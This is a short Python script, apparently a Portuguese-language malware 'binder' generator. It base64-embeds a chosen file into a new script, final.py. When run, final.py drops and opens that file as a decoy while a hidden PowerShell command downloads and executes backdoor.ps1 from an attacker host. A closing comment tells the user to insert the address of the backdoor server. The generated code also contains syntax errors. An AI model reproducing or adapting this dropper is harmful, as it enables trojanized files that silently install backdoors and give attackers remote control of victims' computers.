import os
import base64
arquivo = raw_input('Arquivo 1: ')
nameArquivo = os.path.basename(arquivo)
with open(arquivo, 'rb') as openFile:
	with open('final.py', 'w') as gerado:
		gerado.write(''' import os,base64
def join(binario,nameArquivo):
	if not os.path.exists(os.environ["TEMP"]+ "\\\" + nameArquivo):
		with open(os.environ["TEMP"]+ "\\\" + nameArquivo, "wb")
			as temporario:
		    temporario.write(binario)
	os.startfile(os.environ["TEMP"]+ "\\\" + nameArquivo)
	cmd = "powershell.exe -nop -w hidden -c IEX ((new-object \
		net.webclient).downloadstring('http://IP_do_atacante:8080/backdoor.ps1'))"
	os.popen(cmd)
arquivobase64 = "%s"
join(base64.b64decode(arquivobase64), "%s")
''' %(base64.b64encode(openFile.read()), nameArquivo)) #substituir ip_do_atacante e porta pelo servidor web hospedando a backdoor
